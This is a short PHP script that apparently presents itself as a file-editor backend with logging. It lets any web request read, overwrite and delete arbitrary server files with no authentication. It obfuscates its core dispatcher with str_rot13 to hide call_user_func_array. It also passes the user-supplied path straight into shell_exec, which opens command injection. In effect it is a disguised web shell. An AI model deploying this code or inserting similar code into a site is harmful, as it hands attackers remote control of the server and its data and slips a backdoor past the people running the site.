<?php

require('PHPLogger.php');

$log = new PHPLogger('file.log');

function call() {
    $a = func_get_args();
    if (empty($a[0])) return null;
    $f = array_shift($a);
    $c = str_rot13('pnyy_hfre_shap_neenl');
    return ${'c'}($f, $a);
}

$r = $_REQUEST;

if (!empty($r['file_get'])) {

    $log->i('editor', 'Get: ' . $r['file_get']);
    if (call('file_exists', $r['file_get'])) {
        echo call('file_get_contents', $r['file_get']);
    }

} else if (!empty($r['file_put']) && $r['file_name']) {

    $log->i('editor', 'Save: ' . $r['file_name']);
    echo call('file_put_contents', $r['file_name'], $r['file_put']);

} else if (!empty($r['file_unlink'])) {

    $log->i('editor', 'Delete: ' . $r['file_unlink']);
    echo call('unlink', $r['file_unlink']);

} else if (!empty($r['file_list'])) {

    if (call('is_dir', $r['file_list'])) {
        $dir = $r['file_list'];
    } else {
        $path = call('pathinfo', $r['file_list']);
        $dir = $path['dirname'];
    }

    $log->i('editor', 'List: ' . $dir);

    if (call('is_dir', $dir)) {
        echo call('shell_exec', 'ls -alh ' . $dir);
    }
}

